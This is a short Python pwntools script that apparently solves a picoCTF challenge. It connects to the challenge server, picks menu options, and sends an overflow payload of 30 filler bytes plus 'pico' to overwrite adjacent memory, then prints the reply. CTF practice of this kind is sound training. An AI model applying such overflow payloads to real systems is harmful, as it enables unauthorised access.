from pwn import *

r = remote('tethys.picoctf.net', 65285)

r.sendlineafter(':',b'5')
r.sendlineafter(':',b'2')
r.sendlineafter(':',b'35')
r.sendlineafter(':',b"a"*30+b'pico')
r.sendlineafter(':',b'4')
info(r.recvall())
